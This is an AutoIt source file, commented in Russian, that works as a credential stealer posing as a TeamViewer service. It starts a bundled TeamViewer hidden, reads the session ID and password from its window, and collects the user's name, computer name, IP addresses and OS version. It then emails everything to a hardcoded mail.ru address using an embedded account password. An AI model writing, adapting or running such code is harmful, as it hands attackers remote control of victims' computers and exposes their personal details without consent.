#include <Inet.au3>

;~ $SmtpServer = "smtp.mail.ru"    ; адрес SMTP сервера
;~ $Port = "2525"                  ; Порт SMTP сервера
$FromAddress = "teamviewer.print@mail.ru"   ; адрес отправителя
$ToAddress = "new1ogin@mail.ru"     ; адрес назначения
$Subject = """Служба TeаmViеwer.print"""    ; тема письма
$Body = """Ошибка, запуск не удался"""    ; тело письма (сам текст письма)
;~ $AttachFiles = "C:\boot.ini"    ; прикреплённые файлы к письму
;~ $Username = "test@mail.ru"      ; имя пользователя аккаунта, с которого отправляется
$Password = "iopTHN1!"               ; Пароль
global $IDtv ='Не удалось получить ID', $passtv ='Не удалось получить Pаsswоrd',$PublicIP,$PIDtv=0
;~


global $GetAdress, $GetAdressError=0
$GetAdress = _GetAdress()

Func _GetAdress($AutoItExe='')
;~ $AutoItExe=InputBox('','','TeamViewer newlogin7@gmail.com.exe')
	if $AutoItExe='' then
		$AutoItExe=StringReplace(@AutoItExe,".exe","")
	$GetAdress = StringRegExp($AutoItExe,'(\.|_|-| )([A-Za-z0-9._-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4})',1)
	if not @error then
		msgbox(0,'',$GetAdress[1])
	Else
		$GetAdressError=1
		$AutoItExe=InputBox('','','TeamViewer newlogin7@gmail.com.exe')
	EndIf
	return $GetAdress
EndFunc





;~ $dir='C:\Users\Focus\AppData\Local\Temp\TeamViewer'
;~ ShellExecute($dir)
;~ sleep(500)
if ProcessExists('TeamViewer.exe') = 0 then
	$PIDtv=Run('"'&@ScriptDir&'\TeamViewer.exe" --noInstallation',"",@SW_HIDE)
	ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') : $PIDtv = ' & $PIDtv  & ' >Error code: ' & @error & @CRLF) ;### Debug Console
	sleep(2000)
	$PublicIP = _GetIP()
	ConsoleWrite(' Начинаю ожидать активного окна "TeamViewer"'&@CRLF)
	WinWaitActive("TeamViewer",'',20)
	ConsoleWrite(' Начинаю ожидать появления окна "TeamViewer"'&@CRLF)
	WinWait("TeamViewer",'',20)
	ConsoleWrite(' Начинаю ожидать активного окна "TeamViewer"'&@CRLF)
	$hwnd2=WinWaitActive("TeamViewer",'',20)
	ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') : $hwnd2 = ' & $hwnd2 & @CRLF ) ;### Debug Console
Else
	if WinExists("TeamViewer")=1 then
;~ 		WinActive("TeamViewer")
	Else
		ConsoleWrite(' Ошибка процесс есть, а окно не существует '&@CRLF)
	EndIf
	$PublicIP = _GetIP()
EndIf
;		  sleep(5000)
for $i=0 to 299
	WinClose("Компьютеры и контакты")
	;		  sleep(1000)
	if $PIDtv<>0 then WinSetState("TeamViewer", "", @SW_MINIMIZE )
	;		  sleep(1000)
	$IDtv=ControlGetText ( "TeamViewer", "", "[CLASS:Edit; INSTANCE:2]" )
	;		  sleep(1000)
	$passtv=ControlGetText ( "TeamViewer", "", "[CLASS:Edit; INSTANCE:3]" )
	;		  sleep(1000)
	if StringRegExp ($passtv,'[0-9]')<>0 then ExitLoop
	if MOD($i,99)=0 then
		ConsoleWrite(' таааа-дам '&@CRLF)
		WinActive("TeamViewer")
	endif
	sleep(100)
Next
;		  sleep(1000)
ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') : $password = ' & $passtv & @CRLF ) ;### Debug Console
ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') : $ID = ' & $IDtv & @CRLF ) ;### Debug Console

if $PIDtv=0 Then
	$Body="Служба обнаружила, что программа уже запущена у клиента! Попытка получить логин, пароль..."&@CRLF
Else
	$Body=''
EndIf

if $PublicIP = -1 then
	ConsoleWrite('-> Пытаюсь повторить получение внешнего IP адреса '&@CRLF)
	for $i=1 to 10
		$PublicIP = _GetIP()
		if $PublicIP = -1 then ExitLoop
		sleep(100)
	Next
endif


$Body &= "Службой получены следующие данные: "&@CRLF&'Lоgin (ID):'&@CRLF&$IDtv&@CRLF&'Pаsswоrd:'&@CRLF&$passtv&@CRLF&@CRLF&'<<<Информация о клиенте:>>>'&@CRLF& _
'Имя пользователя: '&@UserName&@CRLF&'Имя компьютера: '&@ComputerName&@CRLF&'Внутренний IP адрес 1: '&@IPAddress1&';  Внутренний IP адрес 2: '&@IPAddress2&@CRLF& _
'Внешний IP адрес: '&$PublicIP&@CRLF&'Версия Windows: '&@OSVersion&'; '&@OSType ;&@CRLF&''&@CRLF&''
ConsoleWrite($Body)
$tt=TimerInit()
global $ReportTcpSend=1
$tSendMail=SendMail($ToAddress, $FromAddress , $Password, $Subject, $Body)
ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') : TimerDiff($tt) = ' & TimerDiff($tt) & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') : $tSendMail = ' & $tSendMail & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console

Func SendMail($To, $sFrom, $sPassw, $sSubject, $sMessage)
    $tTCPStartup=TCPStartup()
	if $ReportTcpSend=1 then ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') : $tTCPStartup = ' & $tTCPStartup & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console

    $iSocket = TCPConnect(TCPNameToIP('smtp.mail.ru'), 25)
	if $ReportTcpSend=1 then ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') : $iSocket = ' & $iSocket & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
    $tTCPSend=TCPSend($iSocket, 'HELO ' & @LogonDomain & @CRLF)
	if $ReportTcpSend=1 then ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') : $tTCPSend = ' & $tTCPSend & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console

    While 1
        $sRecv = TCPRecv($iSocket, 2048)
		if $ReportTcpSend=1 then ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') : $sRecv = ' & $sRecv & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
        If $sRecv <> '' Then
            If StringRegExp($sRecv, '250 smtp(.*).mail.ru') Then TCPSend($iSocket, 'AUTH LOGIN' & @CRLF)
            If StringInStr($sRecv, 'VXNlcm5hbWU6') Then TCPSend($iSocket, _Base64_Encode($sFrom))
            If StringInStr($sRecv, 'UGFzc3dvcmQ6') Then TCPSend($iSocket, _Base64_Encode($sPassw))
            If StringInStr($sRecv, 'Authentication succeeded') Then
                TCPSend($iSocket, 'MAIL FROM: ' & $sFrom & @CRLF)
                TCPSend($iSocket, 'RCPT TO: ' & $To & @CRLF)
            EndIf
            If StringInStr($sRecv, '250 Accepted') Then TCPSend($iSocket, 'DATA' & @CRLF)
            If StringInStr($sRecv, '354 Enter message') Then
                TCPSend($iSocket, 'From: ' & $sFrom & @CRLF)
                TCPSend($iSocket, 'Subject: ' & $sSubject & @CRLF & @CRLF)
                TCPSend($iSocket, $sMessage & @CRLF)
                TCPSend($iSocket, '.' & @CRLF )
            EndIf
            If StringInStr($sRecv, '250 OK id=') Then
                TCPSend($iSocket, 'QUIT' & @CRLF)
                ExitLoop
            EndIf
        EndIf
        Switch StringMid($sRecv, 1, 3)
            Case 421 To 554
                Return SetError(-1, 0, 0)
		EndSwitch
		sleep(10)
    Wend

    $tTCPCloseSocket = TCPCloseSocket($iSocket)
	if $ReportTcpSend=1 then ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') : $tTCPCloseSocket = ' & $tTCPCloseSocket & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
    $tTCPShutdown=TCPShutdown()
	if $ReportTcpSend=1 then ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') : $tTCPShutdown = ' & $tTCPShutdown & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
    Return 1
EndFunc

Func _Base64_Encode($sData, $iFlag = 1)
    Local $Ret, $bData, $tData, $tText
    $bData = StringToBinary($sData, $iFlag)
    $tData = DllStructCreate('byte[' & BinaryLen($bData) & ']')
    DllStructSetData($tData, 1, $bData)
    $Ret = DllCall('crypt32.dll', 'bool', 'CryptBinaryToStringW', 'ptr', DllStructGetPtr($tData), 'dword', DllStructGetSize($tData), 'dword', 1, 'ptr', 0, 'dword*', 0)
    If (@error) Or (Not $Ret[0]) Then
        Return SetError(1, 0, '')
    EndIf
    $tText = DllStructCreate('wchar[' & $Ret[5] & ']')
    $Ret = DllCall('crypt32.dll', 'bool', 'CryptBinaryToStringW', 'ptr', DllStructGetPtr($tData), 'dword', DllStructGetSize($tData), 'dword', 1, 'ptr', DllStructGetPtr($tText), 'dword*', $Ret[5])
    If (@error) Or (Not $Ret[0]) Then
        Return SetError(1, 0, '')
    EndIf
    Return DllStructGetData($tText, 1)
EndFunc